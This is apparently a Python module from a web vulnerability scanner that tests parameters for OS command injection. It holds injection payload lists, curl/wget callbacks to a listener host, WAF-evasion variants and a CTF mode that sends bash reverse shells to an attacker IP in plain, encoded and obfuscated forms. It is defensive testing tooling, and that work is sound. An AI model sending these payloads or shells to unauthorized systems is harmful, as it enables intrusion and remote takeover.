"""
modules/cmdi.py
───────────────
OS Command Injection (CMDi) test module — extracted from V28.

FOR AUTHORIZED SECURITY TESTING AND CTF COMPETITIONS ONLY.

Detection strategies
────────────────────
1. Output-based   — inject arithmetic expr (1337+1=1338); look for result in body
2. Time-based blind — SLEEP/ping delay when output is not reflected
3. OOB (DNS)      — DNS-callback via scanner's OOB server (if available)
4. CTF mode       — enumerates reverse shells, encoders, obfuscated variants

Public API
──────────
    async def run(scanner) -> None

Requires scanner attributes
────────────────────────────
    scanner.config          dict  — verbose, skip_cmdi, ctf_mode, time_threshold
    scanner.param_map       dict[url, list[param]]
    scanner.waf_detected    bool
    scanner.waf_evasion     AdvancedWAFEvasion instance
    scanner._make_request   coroutine(method, url, *, params) → Response|None
    scanner.log_vuln        callable(Vulnerability) → None
    scanner._calculate_severity  callable(str) → (severity, cvss_float)
    scanner.oob_server      EnhancedOOBServer instance (optional)
    scanner.ctf_payloads    CTFPayloadGenerator instance (optional, CTF mode)
"""

from __future__ import annotations

import asyncio
import logging
import time
import urllib.parse
from typing import List, Optional, Tuple

from core.models import Vulnerability, calculate_severity

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Payload data
# ─────────────────────────────────────────────────────────────────────────────

#: (payload, expected_output_substring, platform)
CMD_PROBES: List[Tuple[str, str, str]] = [
    # ── Linux / Unix — arithmetic output ─────────────────────────────────────
    ("; expr 1337 + 1",             "1338", "unix"),
    ("| expr 1337 + 1",             "1338", "unix"),
    ("`expr 1337 + 1`",             "1338", "unix"),
    ("$(expr 1337 + 1)",            "1338", "unix"),
    ("; echo $((1337+1))",          "1338", "unix"),
    ("|| expr 1337 + 1",            "1338", "unix"),
    ("&& expr 1337 + 1",            "1338", "unix"),
    ("\n expr 1337 + 1",            "1338", "unix"),
    ("%0a expr 1337 + 1",           "1338", "unix"),
    ("%0d%0a expr 1337 + 1",        "1338", "unix"),
    ("|expr 1337 + 1",              "1338", "unix"),
    (";expr 1337 + 1",              "1338", "unix"),
    ("$(expr${IFS}1337${IFS}+${IFS}1)", "1338", "unix"),
    ("`expr${IFS}1337${IFS}+${IFS}1`",  "1338", "unix"),
    ('\";expr 1337 + 1;\"',         "1338", "unix"),
    ("';expr 1337 + 1;'",           "1338", "unix"),
    # ── Windows — echo ────────────────────────────────────────────────────────
    ("& echo 1337",                 "1337", "windows"),
    ("| echo 1337",                 "1337", "windows"),
    ("&& echo 1337",                "1337", "windows"),
    ("|| echo 1337",                "1337", "windows"),
    ("& set /a 1337+1",             "1338", "windows"),
]

#: Time-based probes: (payload, sleep_seconds, platform)
TIME_PROBES: List[Tuple[str, int, str]] = [
    ("; sleep 5",           5, "unix"),
    ("| sleep 5",           5, "unix"),
    ("$(sleep 5)",          5, "unix"),
    ("`sleep 5`",           5, "unix"),
    ("%0asleep%205",        5, "unix"),
    ("& ping -n 6 127.0.0.1", 5, "windows"),  # ~5s on Windows
    ("| timeout /t 5",      5, "windows"),
]

REMEDIATION = (
    "1. Avoid calling OS commands from application code; use language-native APIs. "
    "2. If OS commands are unavoidable, use an allowlist of permitted arguments. "
    "3. Never concatenate user input into a shell command string. "
    "4. Run the application with least-privilege OS accounts. "
    "See: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
)


# ─────────────────────────────────────────────────────────────────────────────
# Internal helpers
# ─────────────────────────────────────────────────────────────────────────────

def _make_vuln(
    url: str, param: str, payload: str, evidence: str,
    method: str, detection_method: str,
    confidence: str, severity: str, cvss: float,
    exploitation_notes: str = "",
) -> Vulnerability:
    return Vulnerability(
        type="Command Injection",
        url=url,
        parameter=param,
        payload=payload,
        evidence=evidence,
        confidence=confidence,
        severity=severity,
        cvss_score=cvss,
        method=method,
        detection_method=detection_method,
        remediation=REMEDIATION,
        references=["CWE-78", "OWASP-A03:2021"],
        exploitation_notes=exploitation_notes,
    )


def _ctf_notes(scanner, url: str, param: str, payload: str) -> str:
    """Return CTF exploitation guidance if CTF mode is active."""
    ctf = getattr(scanner, "ctf_payloads", None)
    if not ctf or not scanner.config.get("ctf_mode"):
        return ""
    try:
        return ctf.generate_exploitation_report("Command Injection", url, param, payload)
    except Exception:
        return ""


def _is_guessed_get_param(url: str, param: str) -> bool:
    """
    Return True if *param* was NOT actually present in the URL's query string
    (i.e. it was a guessed/fuzzed parameter).  Guards against noise on GET.
    """
    parsed = urllib.parse.urlparse(url)
    return param not in set(urllib.parse.parse_qs(parsed.query).keys())


# ─────────────────────────────────────────────────────────────────────────────
# Detection strategies
# ─────────────────────────────────────────────────────────────────────────────

async def _test_output(scanner, url: str, param: str, method: str) -> bool:
    """
    Strategy 1 — Output-based injection.
    V29 FIX: baseline comparison — expected output must be absent from the
    uninjected response (e.g. Juice Shop product data naturally contains 1337).
    """
    baseline = await scanner.make_request(method, url, params={param: "safe_probe_value"})
    baseline_text = baseline.text if baseline else ""

    for payload, expected, _platform in CMD_PROBES:
        variants: List[str]
        if getattr(scanner, "waf_detected", False):
            variants = scanner.waf_evasion.generate_variants(payload, 2)
        else:
            variants = [payload]

        for variant in variants:
            res = await scanner.make_request(method, url, params={param: variant})
            if res is None:
                continue

            # V29 FIX: only flag if expected output is NEW — absent from baseline
            if expected in res.text and expected not in baseline_text:
                severity, cvss = calculate_severity("Command Injection")
                notes = _ctf_notes(scanner, url, param, variant)

                scanner.log_vuln(
                    _make_vuln(
                        url, param, variant,
                        f"Command output '{expected}' found in response (absent in baseline)",
                        method, "Command output verification",
                        "High", severity, cvss, notes,
                    )
                )
                return True

    return False


async def _test_time_based(scanner, url: str, param: str, method: str) -> bool:
    """
    Strategy 2 — Time-based blind injection.
    Measures response delta against the configured threshold.
    """
    threshold = scanner.config.get("time_threshold", 4.5)

    for payload, sleep_s, _platform in TIME_PROBES:
        variants: List[str]
        if getattr(scanner, "waf_detected", False):
            variants = scanner.waf_evasion.generate_variants(payload, 2)
        else:
            variants = [payload]

        for variant in variants:
            t0 = time.monotonic()
            res = await scanner.make_request(method, url, params={param: variant})
            elapsed = time.monotonic() - t0

            if res is None:
                continue

            if elapsed >= threshold:
                severity, cvss = calculate_severity("Command Injection")
                notes = _ctf_notes(scanner, url, param, variant)

                scanner.log_vuln(
                    _make_vuln(
                        url, param, variant,
                        f"Response delayed {elapsed:.2f}s (threshold {threshold}s) "
                        f"with sleep={sleep_s}s payload",
                        method, "Time-based blind command injection",
                        "Medium", severity, cvss, notes,
                    )
                )
                return True

    return False


async def _test_oob(scanner, url: str, param: str, method: str) -> bool:
    """
    Strategy 3 — OOB DNS/HTTP callback.
    Requires scanner.oob_server with a reachable callback endpoint.
    """
    oob = getattr(scanner, "oob_server", None)
    if not oob:
        return False

    try:
        oob_host = oob.get_callback_host()
        marker   = f"cmdi_{param[:8]}"
        payloads = [
            f"; curl http://{oob_host}/{marker}",
            f"| wget -q http://{oob_host}/{marker}",
            f"; nslookup {marker}.{oob_host}",
            f"$(curl http://{oob_host}/{marker})",
        ]

        for payload in payloads:
            oob.clear_callbacks()
            await scanner.make_request(method, url, params={param: payload})
            await asyncio.sleep(2)

            if oob.received_callback(marker):
                severity, cvss = calculate_severity("Command Injection")
                notes = _ctf_notes(scanner, url, param, payload)

                scanner.log_vuln(
                    _make_vuln(
                        url, param, payload,
                        f"OOB callback received at {oob_host}/{marker}",
                        method, "Out-of-band command injection (DNS/HTTP callback)",
                        "High", severity, cvss, notes,
                    )
                )
                return True
    except Exception as exc:
        logger.debug("CMDi OOB error: %s", exc)

    return False


async def _test_ctf_shells(scanner, url: str, param: str, method: str) -> None:
    """
    Strategy 4 — CTF mode: enumerate shell payloads.
    Does NOT log a vulnerability (shells are blind); just sends and logs acceptance
    to the scanner's verbose output so the attacker knows what was accepted (200 OK).
    """
    ctf = getattr(scanner, "ctf_payloads", None)
    if not ctf or not scanner.config.get("ctf_mode"):
        return

    verbose = scanner.config.get("verbose", False)
    basic_shell = (
        f"bash -i >& /dev/tcp/{ctf.attacker_ip}/{ctf.attacker_port} 0>&1"
    )

    # Test 2 shells per language with 3 separators
    for lang, shells in ctf.get_reverse_shells().items():
        for shell in shells[:2]:
            for sep in ctf.get_command_separators()[:3]:
                payload = f"{sep} {shell}"
                res = await scanner.make_request(method, url, params={param: payload})
                if res and res.status_code == 200 and verbose:
                    logger.info("[CTF] %s shell accepted (%s): %s", lang, sep, payload[:60])

    # Test encoded shells
    for enc in ["base64", "hex", "double_base64", "gzip_base64"]:
        encoded = ctf.encode_payload(basic_shell, enc)
        res = await scanner.make_request(method, url, params={param: encoded})
        if res and res.status_code == 200 and verbose:
            logger.info("[CTF] %s encoded shell accepted", enc)

    # Test obfuscated shells
    for obf in ctf.get_obfuscated_shells()[:5]:
        res = await scanner.make_request(method, url, params={param: obf})
        if res and res.status_code == 200 and verbose:
            logger.info("[CTF] Obfuscated shell accepted: %s", obf[:60])


# ─────────────────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────────────────

async def run(scanner, url: str, param: str, method: str = "GET") -> None:
    """
    Entry point called by scan_url() per URL × param × method.

    Strategy order:
      1. Output-based (with baseline comparison to eliminate false positives)
      2. Time-based blind (if output-based found nothing)
      3. OOB (if available and nothing found yet)
      4. CTF shell enumeration (CTF mode only, supplementary)
    """
    if scanner.config.get("skip_cmdi"):
        return

    # V24: skip guessed GET params (not present in original query string)
    if method == "GET" and _is_guessed_get_param(url, param):
        return

    found = await _test_output(scanner, url, param, method)

    if not found and not scanner.config.get("skip_time_cmdi"):
        found = await _test_time_based(scanner, url, param, method)

    if not found:
        await _test_oob(scanner, url, param, method)

    if scanner.config.get("ctf_mode"):
        await _test_ctf_shells(scanner, url, param, method)
